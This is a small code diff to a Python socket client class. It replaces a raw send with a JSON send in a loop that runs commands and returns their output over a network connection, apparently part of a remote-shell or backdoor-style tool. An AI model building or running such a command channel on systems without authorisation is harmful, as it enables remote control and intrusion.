@@ -23,7 +23,7 @@ class SocketClient:
         while True:
             command = input("Enter command ")
             command_output = self.command_execution(command)
-            self.connection.send(command_output)
+            self.json_send(command_output)
         self.connection.close()
 
 
